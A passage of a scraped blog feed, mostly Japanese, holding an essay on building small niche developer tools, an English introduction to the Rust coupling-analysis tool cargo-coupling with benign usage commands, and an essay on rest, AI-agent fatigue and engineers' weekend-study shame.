機能が入ったら、どうするか。喜んで捨てる。それは「失敗した」のではなく「役目を終えた」のだ。本流に吸収されるために、意図的にやっていないことは何か。汎用化だ。本流は汎用的になろうとする。隙間家具は特殊なままでいい。特殊だから、本流が取り込みにくい。特殊だから、生き残れる。隙間家具は、状況が変われば不要になる。Kubernetesのバージョンが上がって、その問題が解決されるだろう。別のツールが登場して、より良い解決策を提供するだろう。だから、依存を少なく、シンプルに作る。捨てやすく作る。大きな家具は、捨てにくい。多くのリソースを投入している。多くの人が使っている。捨てることが難しい。隙間家具は、捨てやすい。役目を終えたら、捨てる。そして、新しい隙間を見つけて、新しい隙間家具を作る。「隙間」が「本流」に飲み込まれるリスクもある。Kubernetesのサイドカー機能が進化するように、プラットフォーム自体が隙間を埋めてしまうことがある。これに対する私の戦略は2つだ。1つ目は、捨てやすく作ること。本流に飲み込まれたら、素直に捨てる。自分の問題意識が正しかった証拠だと喜ぶ。2つ目は、本流が手を出さないニッチに特化すること。Kubernetesは汎用的になろうとする。だから、特定の会社の特定のワークフローに特化したツールは、本流が取り込みにくい。汎用化できないほど特殊なニッチを狙う。これも生存戦略だ。捨てたツールから得られる学びもある。単なる「失敗」で終わらせず、次の探索に活かせる知見を抽出する。私がやっているのは、「なぜこのツールは役目を終えたのか」を言語化することだ。本流に取り込まれたのか。別のツールが出てきたのか。そもそも問題設定が間違っていたのか。この分析が、次の隙間を見つける精度を上げる。「問題設定が間違っていた」が一番の学びだ。次は同じ間違いをしない。深化と探索隙間家具を1つ作ったら、終わりではない。隙間家具の開発には、2つの仕事がある。「深化」と「探索」だ。「深化」は、既存の隙間家具を改善すること。バグを直す。パフォーマンスを改善する。ドキュメントを整える。「探索」は、新しい隙間を見つけること。新しい用事を発見すること。新しい隙間家具を作ること。問題は、「深化」へ偏りやすいことだ。既存のツールへイシューが立つ。プルリクエストが来る。対応すると達成感がある。でも、これだけやっていると、最初に見つけた隙間だけを相手にし続けてしまう。競争のないところに宝がある。既存の競合がひしめく場所ではなく、誰も見ていない場所を探す。だから2026年、私はこう決めた。小さな実験を続ける。1つの隙間家具に全力を注ぐのではなく、複数の隙間家具を作り、どれが使われるか見る。全部が使われるわけではない。むしろ、使われないものの方が多い。でも、それでいい。使われなかったツールからも、学びがある。その学びが、次の探索に活きる。チーム開発での引き算ここまでの話は、一人で作る「隙間家具」を前提にしてきた。では、複数人で開発するときはどうか。「引き算の哲学」をチームで共有できるのか。私の経験では、スコープを最初に合意することが鍵だ。「このツールは何を解決し、何を解決しないか」を、開発を始める前にドキュメントへ書く。機能追加の提案が来たら、このドキュメントに立ち返る。「このスコープ外です」と言える根拠になる。チームでの合意形成は、一人のときより難しい。でも、「1つのREADMEで説明できる範囲」という制約は、チームでも使える。「この機能を追加したら、READMEはどう変わるか」を問う。READMEが複雑になるなら、その機能は入れないか、別のツールにする。この基準は、チームメンバー全員が判断できる。個人の好みではなく、客観的な基準だ。おわりにここまで読んでくれた人に、正直に書く。この文章を書きながら、私は何度も手を止めた。「こんなこと書いて意味あるのか」「誰が読むんだ」「もっといい構成があるんじゃないか」。書いている最中に、書くのをやめる理由を探している自分がいた。「代表作」に届かない理由と、まったく同じ構造だ。笑えない。2026年、私は隙間家具を20個作ると決めた。完璧じゃなくていい。動けばいい。使われなくてもいい。作ることそのものに意味がある。そう自分に言い聞かせている。本当にできるかは、分からない。来年の今頃、GitHubにリポジトリが20個並んでいる保証はどこにもない。また「時間がなかった」「優先順位が」と言い訳しているかもしれない。その可能性は、正直、かなり高い。でも、書いた。こうして宣言してしまった。「何を作ればいいか分からない」という人へ。それは正常だ。ゴールは最初から見えているものじゃない。作っているうちに、少しずつ輪郭が浮かんでくる。だから今日、30分だけ時間を取って、最近「面倒だな」と思った作業を1つ書き出してみてほしい。それを解決するスクリプトを書く。動いたら公開する。それだけでいい。20回繰り返す頃には、自分が本当に作りたいものが見えてくる。たぶん。見えてこなかったら、そのときはまた考える。ところで、ここまで偉そうに書いてきたが、私は孤独な独身男性だ。家族はいない。守るべきものが少ない分、狂いやすい環境にいるとも言える。歯止めをかけてくれる人がいない分、自分で自分を律する必要がある。友達との飯の予定。ジムの予約。強制的に「コードを書かない時間」を作らないと、際限なく沈んでいく。独身には独身の戦い方がある。OSSより大事なものはある。友達と話す時間。体を動かす時間。コードは逃げない。隙間家具はいつでも作れる。でも、友人との関係は放っておくと薄れる。健康は一度壊すと戻らない。狂うなら、余裕のあるときに狂え。順番を間違えると、人生ごと壊れる。......と、説教じみたことを書いたが、たぶん来年の今頃の私は、この文章を読み返して頭を抱えている。「狂う」とか言って、結局また「そこそこ」で終わったじゃないか、と。nwiizoというアカウントは、また少し大きくなっているだろう。「代表作」のハードルも、また少し上がっているだろう。自分で自分の首を絞める構造は変わらない。それでも、諦めたくない。憧れたエンジニアたちがいる。彼らのように、「これを作りました」と胸を張れる日が来るまで、手を動かし続ける。だから、書いておく。まず狂え。量をやれ。そして、量が満ちたら、容赦なく削れ。答えが出ない状態は、苦しい。でも、その苦しさの中を泳ぎ続けることでしか、本当に作りたいものは見つからない。完璧を待たない。不完全なまま公開する。恥をかく覚悟で、手を動かす。2026年は、そういう年にする。できるかどうかは知らない。でも、やると決めた。隙間を見つけたら、小さく狂おう。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考文献人生にコンセプトを (ちくまプリマー新書)作者:澤田智洋筑摩書房Amazonセンスは知識からはじまる作者:水野学朝日新聞出版Amazonセンスの哲学 (文春e-book)作者:千葉 雅也文藝春秋Amazon人生の経営戦略――自分の人生を自分で考えて生きるための戦略コンセプト２０作者:山口 周ダイヤモンド社Amazon「面白い！」を見つける　――物事の見え方が変わる発想法 (ちくまプリマー新書)作者:林雄司筑摩書房AmazonTHINK BIGGER 「最高の発想」を生む方法：コロンビア大学ビジネススクール特別講義 (NewsPicksパブリッシング)作者:シーナ・アイエンガーニューズピックスAmazonわかったつもり～読解力がつかない本当の原因～ (光文社新書)作者:西林 克彦光文社Amazon知ってるつもり　無知の科学 (ハヤカワ文庫NF)作者:スティーブン スローマン,フィリップ ファーンバック早川書房Amazon私が間違っているかもしれない作者:ビョルン・ナッティコ・リンデブラッド,キャロライン・バンクラー,ナビッド・モディリサンマーク出版Amazon不完全主義　限りある人生を上手に過ごす方法作者:オリバー・バークマンかんき出版Amazon熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon新版 いくつになっても、「ずっとやりたかったこと」をやりなさい。作者:ジュリア・キャメロン,エマ・ライブリーサンマーク出版Amazonいくつになっても恥をかける人になる【DL特典 恥克服ワークシート】作者:中川諒ディスカヴァー・トゥエンティワンAmazon増補改訂版 スマホ時代の哲学 なぜ不安や退屈をスマホで埋めてしまうのか (ディスカヴァー携書)作者:谷川嘉浩ディスカヴァー・トゥエンティワンAmazon自分とか、ないから。　教養としての東洋哲学作者:しんめいPサンクチュアリ出版Amazon人生のレールを外れる衝動のみつけかた (ちくまプリマー新書)作者:谷川嘉浩筑摩書房Amazon行動する人に世界は優しい―自分の可能性を解き放つ言葉―作者:佐藤航陽新潮社Amazon","isoDate":"2025-12-22T04:55:17.000Z","dateMiliSeconds":1766379317000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"決断をプロットし、全力で走り続けるためのプロジェクトドキュメント管理","link":"https://zenn.dev/kamos/articles/adr_documentation","contentSnippet":"!この文章は人間が書きました画像はGeminiを使って生成しました なぜ、私たちはドキュメントを求めるのか開発現場において、ドキュメント管理は永遠の課題だ。点在する情報、矛盾する記述、実装との乖離、記されない背景情報など、ドキュメントの陳腐化は様々な形で現れる。これらに立ち向かおうとしては、その管理コストの高さに圧倒される。効果が明確に見えにくく、長い時間のかかるドキュメント整備をやり切ることは難しく、多くの現場でドキュメントは放置され、陳腐化し続けている。今度こそドキュメントの整備をやり切ると決意し、絶望する前に考えてほしい。私たちはなぜドキュメントがほしいのか？欲しいも...","isoDate":"2025-12-22T03:55:55.000Z","dateMiliSeconds":1766375755000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"cargo-coupling: Visualizing Coupling in Rust Projects","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/21/152559","contentSnippet":"cargo-coupling Web UI - Self-diagnosis viewIntroduction\\"I really don\'t want to touch this module...\\"If you\'ve been developing software long enough, you know this feeling. Every change breaks something else. Tests are painful to write. Understanding what the code even does feels impossible. These symptoms share a common root cause: modules that depend too heavily on each other—the problem of coupling.Coupling problems are insidious. They\'re hard to notice while you\'re writing code, only revealing themselves later when you wonder why changes are so difficult. What makes it worse is that even when you know \\"coupling is too tight,\\" it\'s hard to see exactly where and how, or where to start fixing it.Looking back, I realize my understanding of coupling was quite shallow. I was making judgments based on vague feelings—\\"this seems tightly coupled\\" or \\"loose coupling is supposedly better\\"—but when I tried to articulate why, I couldn\'t explain it clearly.To address this lack of visibility, we need a way to measure coupling. But the traditional single axis of \\"strong vs. weak\\" isn\'t enough. The same \\"strong coupling\\" means different things depending on where it occurs and in what context.This brings us to Vlad Khononov\'s concept of \\"Balanced Coupling.\\" It\'s a framework that evaluates coupling across three dimensions: strength, distance, and volatility, then assesses their balance. cargo-coupling is a tool I developed to implement this framework for Rust projects.Even as AI writes more of our code, this coupling metric becomes increasingly important. Regardless of who or what writes the code, humans still need to understand, maintain, and extend it. In fact, precisely because AI generates code, we need objective measures to evaluate its structure.Let\'s start with an overview of the tool, then explore the underlying concepts, and finally see how to use it in practice.What is cargo-coupling?cargo-coupling is a coupling analysis tool I developed for Rust projects.The inspiration came from Vlad Khononov\'s book \\"Balancing Coupling in Software Design.\\" The challenges I had vaguely sensed about coupling design were systematically organized in this book. I was impressed by the framework that captures coupling through three dimensions—strength, distance, and volatility—and wanted to create a tool that makes this practical for Rust projects. I highly recommend picking up the book.The tool is available on GitHub. If you find it useful, I\'d appreciate a star!GitHub:github.comcrates.io: https://crates.io/crates/cargo-couplingNow, let\'s challenge a common assumption.\\"Coupling should be minimized\\"—isn\'t that what you believe?This tool doesn\'t aim to \\"reduce coupling.\\" It aims to \\"design coupling appropriately.\\" Why? Because coupling isn\'t inherently bad. Related functionality working closely together is natural. The problem is \\"strong coupling in inappropriate places\\" or \\"tight coupling between distant modules.\\" This shift in perspective is at the heart of this tool.# Installationcargo install cargo-coupling# Basic usagecargo coupling ./srcAnalyzing Coupling Across Three DimensionsSo what exactly constitutes \\"appropriate coupling\\"?Traditional coupling analysis tends to think in terms of a single \\"strong/weak\\" axis. But stop and consider: strong coupling with an adjacent module versus strong coupling with a distant external library—shouldn\'t these mean different things? And coupling with code unchanged for five years versus coupling with code modified weekly—shouldn\'t these carry different risks?A single axis can\'t capture these differences. cargo-coupling measures coupling across three independent dimensions.1. Integration StrengthThe first dimension is \\"coupling strength\\"—how much modules know about each other\'s internals.Have you seen code like user.password_hash that directly accesses struct fields? That\'s the strongest form of coupling. Meanwhile, code that interacts through impl Trait works without knowing the other\'s internals. This difference gets quantified as a score. Level  Score  Description  Rust Example  Intrusive  1.00  Direct dependency on internal implementation  struct.field direct access  Functional  0.75  Dependency on function signatures  Method calls  Model  0.50  Dependency on data structures  Type definitions, type parameters  Contract  0.25  Interface/trait only  impl Trait 2. DistanceThe second dimension is \\"distance\\"—how far apart coupled modules are in the code\'s scope hierarchy.Functions within the same file working closely together is natural. But what if src/auth/login.rs directly references src/billing/invoice.rs? Or worse, depends on an external crate\'s internal structure? The farther the distance, the \\"heavier\\" that coupling becomes. Level  Score  Description  SameModule  0.25  Within the same file/module  DifferentModule  0.50  Different module in the same crate  DifferentCrate  1.00  External crate dependency 3. VolatilityThe third dimension is \\"volatility\\"—how frequently the code changes.Your project surely has stable modules untouched for over a year alongside modules modified weekly. Depending on stable code versus frequently changing code carries different risks. cargo-coupling automatically calculates this volatility from Git history. Level  Score  Changes in 6-month Git history  Low  0.00  0-2 changes  Medium  0.50  3-10 changes  High  1.00  11+ changes Calculating the Balance ScoreWe\'ve covered the three dimensions. But if you\'re told \\"strength is 0.75,\\" \\"distance is 0.50,\\" \\"volatility is medium\\"—how do you judge whether this coupling is actually good or bad?cargo-coupling combines these three dimensions into a balance score. By consolidating three numbers into one score, you can intuitively assess whether coupling is appropriate.The concept is simple: multiply \\"strength-distance balance\\" by \\"volatility risk.\\"ALIGNMENT = 1.0 - |STRENGTH - (1.0 - DISTANCE)|VOLATILITY_IMPACT = 1.0 - (VOLATILITY \xd7 STRENGTH)BALANCE_SCORE = ALIGNMENT \xd7 VOLATILITY_IMPACTThe first formula measures whether strength and distance are proportionate. Close distance can tolerate strong coupling; far distance should mean weak coupling. The second formula measures the combined risk of change frequency and coupling strength. Strong coupling with frequently changing code means higher risk of being affected by every change.The conclusions this formula leads to:Strong coupling + Close distance → Good: High cohesion with related functionality in one moduleWeak coupling + Far distance → Good: Loose coupling architecture with minimal inter-module dependenciesStrong coupling + Far distance → Bad: Global complexity where changes affect wide areasStrong coupling + High volatility → Bad: Change propagation risk where frequent changes cascadePractical UsageNow that we understand the theory, let\'s see how to use it on real projects. cargo-coupling offers multiple output formats depending on your needs.Summary Displaycargo coupling --summary ./srcExample output:Coupling Analysis Summary:  Health Grade: B (Good)  Files: 14  Modules: 14  Couplings: 389  Balance Score: 0.83  Issues:    Medium: 2  Top Priority:    - [Medium] cargo-coupling::main → 21 dependencies    - [Medium] 21 dependents → cargo-coupling::cargo_coupling  Breakdown:    Internal: 33    External: 356    Balanced: 33    Needs Review: 0    Needs Refactoring: 0  Connascence:    Total: 807 (avg strength: 0.23)    High-strength: Position=2, Algorithm=2  APOSD Metrics:    Pass-Through Methods: 12 (simple delegation)    High Cognitive Load: 2 modules    Avg Module Depth: 7.9Hotspot AnalysisIdentify high-priority modules that need refactoring.cargo coupling --hotspots ./src#1 my-project::main (Score: 55)   \uD83D\uDFE1 Medium: High Efferent Coupling   \uD83D\uDCA1 What it means:      This module depends on too many other modules   ⚠️  Why it\'s a problem:      • Changes elsewhere may break this module      • Testing requires many mocks/stubs      • Hard to understand in isolation   \uD83D\uDD27 How to fix:      Split into smaller modules with clear responsibilities      e.g., Split main.rs into cli.rs, config.rs, runner.rsImpact AnalysisExamine the impact scope when changing a specific module.cargo coupling --impact metrics ./srcWeb UI VisualizationVisualize coupling relationships with an interactive graph.cargo coupling --web ./srcA browser opens automatically, displaying an interactive graph using Cytoscape.js. Click nodes to see detailed information; problematic modules are color-coded.CI/CD IntegrationBeyond manual analysis, you can continuously monitor quality. Incorporating cargo-coupling as a quality gate enables early detection of coupling design degradation.cargo coupling --check \\\\  --min-grade=B \\\\  --max-circular=0 \\\\  ./srcGitHub Actions example:- name: Check coupling health  run: |    cargo coupling --check \\\\      --min-grade=B \\\\      --max-critical=0 \\\\      ./srcReturns exit code 1 when the grade falls below the threshold, making it easy to integrate into CI pipelines.AI IntegrationWhen using with Claude Code or GitHub Copilot, the --ai option is convenient.cargo coupling --ai ./srcOutput is formatted in an AI-friendly way, so you can paste it directly into AI tools to get refactoring suggestions.Detected Problem PatternsHaving covered usage, you might wonder what specific problems get detected. Here are the representative patterns cargo-coupling warns about.God ModuleA module with too many functions, types, or impls.Functions: 30+Types: 15+Impls: 20+High Efferent CouplingA module with too many dependencies. Default threshold is 20+ dependencies.High Afferent CouplingA module depended on by too many others. Default threshold is 30+ dependents.Cascading Change RiskThe combination of intrusive coupling and high volatility. A dangerous state where changes propagate across wide areas.Interpreting Health GradesDetection results are ultimately consolidated into a single grade representing overall project health. Grade  Description  S  Over-optimized. Might be over-refactored  A  Well-balanced. Ideal state  B  Healthy. Manageable condition  C  Room for improvement  D  Attention needed  F  Immediate action required Interestingly, S grade is considered \\"overdone.\\" Why?Reducing coupling too much fragments code excessively, making the big picture harder to see. Have you experienced needing to open 10 files to trace a single operation, or getting lost in abstraction layers so deep you wonder \\"what does this actually do?\\"Coupling isn\'t simply \\"less is better.\\" Balance is key.Library UsageBeyond the CLI tool, you can embed it in your own tools. cargo-coupling is also published as a library, allowing you to call analysis functions directly from code.use cargo_coupling::{    analyze_workspace,    analyze_project_balance_with_thresholds,    IssueThresholds,    VolatilityAnalyzer,};fn main() -> Result<(), Box<dyn std::error::Error>> {    // AST analysis    let mut metrics = analyze_workspace(Path::new(\\"./src\\"))?;    // Git volatility analysis    let mut volatility = VolatilityAnalyzer::new(6);    volatility.analyze(Path::new(\\"./src\\"))?;    metrics.file_changes = volatility.file_changes;    metrics.update_volatility_from_git();    // Balance analysis    let report = analyze_project_balance_with_thresholds(        &metrics,        &IssueThresholds::default()    );    println!(\\"Grade: {}\\", report.health_grade);    Ok(())}Performancecargo-coupling is designed to run fast even on large projects.Parallel AST analysis with RayonStream processing of Git historyBenchmarks: 655ms on tokio (488 files)Use the --no-git option to skip Git analysis for even faster operation.LimitationsWhile useful, this tool isn\'t omnipotent. Know these limitations before using it.External crate dependencies aren\'t analyzed: Dependencies on serde, tokio, etc. aren\'t analyzed since developers can\'t control themStatic analysis only: Runtime behavior and macro expansion aren\'t fully capturedGit history required: Volatility analysis needs Git history. Short history reduces accuracyConclusioncargo-coupling provides a practical approach of \\"choosing appropriate coupling\\" rather than the simplistic view that \\"coupling is bad.\\"3-dimensional analysis: Considers strength, distance, and volatility simultaneouslyGit integration: Reflects actual change frequency as dataActionable suggestions: Presents concrete refactoring actionsMultiple output formats: Text/JSON/Web UI/AI-friendlyCI/CD integration: Automated checks as quality gatesYou don\'t need perfect design. With a pragmatic attitude that \\"80% improvement is enough,\\" gradually improve your project\'s health.# Try it outcargo install cargo-couplingcargo coupling --summary ./srcJust visualizing coupling problems is the first step toward better design.The next time you feel \\"I really don\'t want to touch this module...\\"—that\'s no longer a vague anxiety. It\'s a tractable challenge you can analyze across three dimensions of strength, distance, and volatility, and translate into concrete improvement actions. That feeling isn\'t something to fear; it\'s the entry point to improvement.A related concept is \\"Complexity\\" from John Ousterhout\'s \\"A Philosophy of Software Design.\\" It offers another valuable perspective and is well worth reading.","isoDate":"2025-12-21T06:25:59.000Z","dateMiliSeconds":1766298359000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"A Beginner’s Guide to Pulumi: Provisioning Your First Infrastructure with Python","link":"https://daisuke1024akagawa.medium.com/a-beginners-guide-to-pulumi-provisioning-your-first-infrastructure-with-python-1fd8b323f86d?source=rss-c54ac439ad2b------2","isoDate":"2025-12-21T04:29:37.000Z","dateMiliSeconds":1766291377000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":" おい、休め","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/21/092456","contentSnippet":"はじめに金曜日の夜、ベッドの上でこの文章を書き始めている。先週の土日は何をしていたかと聞かれたら、たぶん「寝てた」と答える。嘘ではない。ベッドにいた時間は長かった。ただ、眠っていたかというと怪しい。スマホを持ったまま横になって、気づいたら夕方だった。そういう二日間だった。休んだのか、と聞かれると困る。体は動かしていない。仕事もしていない。だから休んだと言えば休んだのだろう。でも、回復したかというと、していない。月曜の朝を迎える自分は、金曜の夜の自分より確実に疲れている。 何もしていないのに。何もしていないから、かもしれない。30歳になった。エンジニアとして働いている。在宅勤務というやつだ。2025年、AIエージェントが当たり前になった時代を生きている。AIは文句を言わない。疲れたとも言わない。24時間動ける。私にはそれができない。コーヒーがないと朝は動けないし、金曜の午後は集中力が死んでいる。土日は「充電」と称してベッドに沈んでいる。それでも充電されない。この一年、ずっとそうだった。ある日、気づいたことがある。私は「休んでいる」んじゃなくて、「動けなくなっている」だけだった。充電じゃなくて、バッテリー切れの放置だった。「休んでいるのに休めていない」とは、「休んでいるのに休めていない」。変な問答である。矛盾しているように聞こえるが、多くの人がこの感覚を知っていると思う。週末を過ごしたはずなのに、月曜日の朝に疲れが残っている。肉体的には、労働的には、確かに「活動していない」。仕事をしていない。オフィスにいない。だから「休んでいる」となんとなく認識する。しかし脳は、休んでいない。ベッドに横になりながらスマホを見ている時、目は画面を追い、脳は情報を処理し、感情は刺激に反応し続けている。通知が来るたびに注意が引かれる。SNSのタイムラインをスクロールするたびに、微小な判断が積み重なる。「これは読む価値があるか」「これにいいねするか」「これに反応すべきか」。身体は止まっているが、脳は回り続けている。これが「休んでいるのに休めていない」の正体だ。情報を入れ続けると、脳は整理する暇がない。食べ続けて消化できない胃のように、頭がパンク状態になる。入力過多で、整理が追いついていない。なぜ本人は「休んでいるつもり」になってしまうのか厄介なのは、本人が気づいていないことだ。私もそうだった。「横になっている＝休んでいる」。この等式が、骨の髄まで染み込んでいる。かつて「休む」とは、物理的に動かないことを意味した。畑仕事を終えて家に帰り、座って何もしない。工場での労働を終えて、ソファに横になる。肉体労働の時代には、「動かない = 休息」という等式が成り立っていた。しかし現代のデスクワーク的な仕事は、主に脳を使う。特にエンジニアは、一日中座っている。肉体は動いていない。だから「仕事 = 動くこと」という図式が崩れている。そして「休息 = 動かないこと」という古い図式をそのまま適用すると、「横になってスマホを見ること」も休息にカウントされてしまう。肉体的には動いていないのだから。でも実際には、脳は仕事中と同じかそれ以上に動いている。休息の定義を更新する必要がある。現代において「休む」とは、脳への入力を減らすことだ。物理的な動きの有無ではなく、認知的な負荷の有無で判断すべきなのだ。この状態を言語化できないと、何がさらに悪化するのか「休んでいるのに休めていない」という感覚を言葉にできないと、さらに深刻な問題が起きる。まず、自己診断を誤る。「十分休んでいるはずなのに疲れている。だから自分は病気かもしれない」「自分は人より弱いのかもしれない」。実際には休息の質の問題なのに、自分の身体や精神に問題があると思い込んでしまう。次に、対処法を間違える。「もっと休めばいい」と考えて、さらに長時間ベッドでスマホを見る時間を増やす。これは逆効果だ。質の悪い休息を量で補おうとしても、回復はしない。そして最も深刻なのは、周囲に理解されないことだ。「週末何してたの？」「ずっと寝てた」「じゃあ休めたね」。この会話で、問題は見えなくなる。本人も「確かに休んだはずだ」と思い込み、周囲も「休んだのだから元気なはずだ」と期待する。「休んだ」という事実と、「休めた」という実感の乖離。これが現代の休息における新しい病だ。言語化できない問題は、解決できない。 だからまず、この状態に名前をつけることが重要だ。「偽りの休息」「見せかけの休息」「脳が休まらない休息」。何でもいい。言葉にすることで、初めて問題として認識できる。AIエージェント時代の疲労2025年、AIエージェントが本格的に動き始めた。Claude Code、Devin、Cursor Agent。これらは単なるツールではない。私たちと同じように考え、判断し、実行する存在になった。コードを書くだけでなく、何を書くべきかを考える。指示を待つだけでなく、自ら次のステップを提案する。この変化は、エンジニアの疲労の質を根本から変えた。AIは無限に働ける。私たちは有限だ。AIエージェントは疲れない。朝も夜も関係ない。週末も祝日も関係ない。感情の浮き沈みもない。モチベーションの低下もない。常に一定のパフォーマンスで、無限に働き続ける。私たちは、そうではない。8時間働けば疲れる。集中力は25分で途切れる。昼食を食べすぎると眠くなる。金曜日の午後は効率が落ちる。睡眠不足の翌日は判断を誤る。感情に左右される。体調に左右される。天気にすら左右される。この対比が、2025年の疲労を特殊なものにしている。かつて、比較対象は同僚だった。隣の席のエンジニアより速くコードを書けるか。チームの中で自分はどの位置にいるか。人間同士の比較だった。今、比較対象にAIが加わった。AIエージェントが一晩で書いたコードを見て、「自分が一週間かかることを、一晩でやった」と思う。AIが瞬時に出した答えを見て、「自分が一時間悩んだことを、数秒で解決した」と思う。無限と有限を比較している。もちろん、話はそう単純じゃない。AIにも限界がある。文脈を読み違える。ハルシネーションを起こす。「それっぽい嘘」を自信満々に言う。コードレビューなしでマージしたら、後で痛い目に遭う。AIが「無限に働ける」のは事実だが、「無限に正しい」わけではない。でも、そんなことは分かっている。分かっていても、比較してしまう。「比較しなければいい」と思ったこともある。でも、環境がそれを許さなかった。同じSlackチャンネルに、自分が1日かけて作ったPRと、AIが1時間で作ったPRが並んでいる。見た瞬間に、脳が勝手に比較する。「あっちの方が速い」と。そう思った時点で、もう比較している。これは意志の問題じゃない。環境の問題だ。同じ画面に並んで表示されている限り、見比べてしまう。見比べれば、負ける。負ければ、「自分は遅い」「自分は非効率だ」「自分は価値がない」と感じる。この感覚が、静かに、確実に、私たちを消耗させている。AIによって増えたのは「作業量」だけではなく、AIエージェントを使うと、作業は速くなる。コードの生成、ドキュメントの作成、調査の実行。これらは確かに効率化される。しかし、楽にはならない。夕方になると、頭が重い。コードを書く時間は減った。でも疲労感は増えている。増えたのは作業量じゃない。判断の回数だ。AIエージェントは大量の選択肢を提示する。コードの候補を10個出す。アプローチを5つ提案する。修正案を複数示す。これらを評価し、選択し、修正し、採用するかどうかを決めるのは人間だ。従来の仕事では、一つのタスクに対して一つの判断があった。自分で作るから、作成と判断が一体化していた。AIを使うと、この構造が変わる。AIが10個の選択肢を提示する。人間は10個を評価し、1つを選ぶ。あるいは「どれも違う」と判断して再生成を指示する。今度は別の10個が出てくる。また評価する。選ぶ。修正を指示する。一つのタスクに対して、判断の回数が爆発的に増える。思い当たることがある。午前中は「これがいい」「あれはダメ」とサクサク判断できる。でも夕方になると、どれを選んでいいか分からなくなる。「どれでもいいから決めてくれ」と思う。頭が重くなって、判断を先延ばしにしたくなる。これは、判断そのものに消耗があるということだ。人間が一日に下せる質の高い判断の数には限りがある。 判断を重ねるほど、後の判断の質は落ちる。AIは判断を代行してくれない。むしろ、判断すべき選択肢を増やす。だから、作業時間が減っても、認知的な消耗は増える。「便利になった」という感覚と、「楽になった」という現実は、必ずしも一致しない。「速くなった」と感じるのに、疲れは減らない。この乖離は危険だ。「速くなっている」と思い込んでいる限り、「なぜ疲れるのか」という問いにたどり着けない。AI疲れはスキル不足の問題ではないAI疲れを感じたとき、多くの人はこう考える。「自分のスキルが足りないからだ」「もっとAIを使いこなせるようになれば楽になる」。正直に言うと、私もそう思っていた。だから毎晩、新しいツールを試し、プロンプトを改善し、ワークフローを最適化した。でも楽にはならなかった。むしろ疲れた。ただ、ここで立ち止まって考えたい。私はこう思うようになった。それは違うんじゃないか、と。確かに、AIツールの使い方には習熟曲線がある。最初は戸惑う。慣れれば効率が上がる。しかし、ある程度習熟した後も、判断疲れは消えない。むしろ、AIを使いこなせるようになるほど、使う頻度が上がり、判断の回数も増える。AI疲れ ≠ スキル不足。AI疲れ = 判断疲れだ。 あなたが下手なんじゃない。ゲームのルールが変わったのだ。AIは人間の判断を代行しない。判断の対象を増やす。この構造的な問題は、スキルアップでは解決しない。解決策は、使い方を変えることだ。AIに全てを任せるのではなく、判断の負荷が高い場面では意識的に使わない。あるいは、AIの出力をそのまま採用する覚悟で使う（評価・修正のループを断ち切る）。しかしこれは、「AIを使いこなす」という文脈では語られない。だから多くのエンジニアは、スキル不足を疑い、さらに学習し、さらに使い、さらに疲れる。AI疲れの原因を正しく特定して認識することが、回復への第一歩だ。「恥」という名の監視システムエンジニアには、独特の恥の文化がある。Xを開く。誰かが「今週読んだ技術書3冊」と投稿している。誰かが「個人開発で新しいフレームワークを試した」と書いている。GitHubの草が青々と茂っている。日曜日の夜に。その瞬間、土日に何もしなかった自分が恥ずかしくなる。「エンジニアは勉強し続けなければならない」。これは真実だ。技術は進化する。学ばなければ置いていかれる。それは分かっている。でも、いつからか「土日に勉強するのが当たり前」になった。休日に技術書を読まないと不安になる。個人開発をしていないと焦る。Qiitaに何も投稿していない月があると、自分の価値が下がった気がする。私たちは「恥」に操られている。恥は、外部から強制されるものではない。誰かに「勉強しろ」と言われているわけではない。上司が土日の学習を義務付けているわけでもない。自分で自分を監視している。 SNSで他人の「充実した週末」を見て、勝手に比較して、勝手に恥じて、勝手に休めなくなっている。これが最も効率的な搾取システムだ。命令する必要がない。監視する必要がない。本人が勝手に自分を追い詰めてくれる。見せかけの「学習」が休息を奪う問題は、この「恥を避けるための学習」が、本当の意味での学習になっていないことだ。土曜日の朝、罪悪感から技術書を開く。でも頭に入ってこない。疲れているから。ページをめくるけど、内容が定着しない。それでも「読んだ」という事実が欲しくて、最後までめくる。これは学習ではない。休息でもない。どちらでもない時間だ。本当に学びたいときの読書と、恥を避けるための読書は、まったく別物だ。前者は楽しい。後者は苦痛だ。前者は定着する。後者は忘れる。恥を避けるために費やした土日は、学習にも休息にもならない。最悪の投資だ。 時間を使って、何も得られず、回復もしない。SNSで他人の土日を見るな。あれは広告だ。冷静に考えてほしい。Xに投稿される「充実した週末」は、全員の週末の平均ではない。投稿したくなるような週末だけが投稿される。何もしなかった週末は投稿されない。つまり、タイムラインに流れてくるのは、全エンジニアの「最も充実した瞬間」の集合体だ。それを自分の「普通の週末」と比較している。勝てるわけがない。他人の土日は広告だ。 広告と自分を比較して落ち込むのは、モデルの写真を見て自分の顔を恥じるのと同じだ。フィルターがかかっている。編集されている。現実ではない。恥を手放すことは、怠惰ではない「じゃあ勉強しなくていいのか」と思うかもしれない。そうではない。学びたいときに学べばいい。休みたいときに休めばいい。恥に駆動されるのをやめろ、と言っている。恥から学習すると、燃え尽きる。好奇心から学習すると、続く。この違いは大きい。土日に何もしなかった自分を、責めなくていい。月曜日に元気に働けるなら、それが正解だ。GitHubの草が生えていなくても、あなたの価値は変わらない。恥は、休息の最大の敵だ。 